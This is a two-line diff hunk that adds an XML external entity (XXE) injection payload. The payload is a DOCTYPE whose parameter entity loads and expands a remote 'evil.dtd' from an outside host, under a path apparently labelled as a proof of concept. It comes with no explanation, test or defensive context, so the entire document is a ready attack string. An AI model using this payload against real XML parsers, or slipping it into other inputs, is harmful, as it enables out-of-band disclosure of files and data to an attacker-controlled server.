@@ -1,0 +1,2 @@
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://balvant.in/poc/xxe/evil.dtd"> %xxe;]>
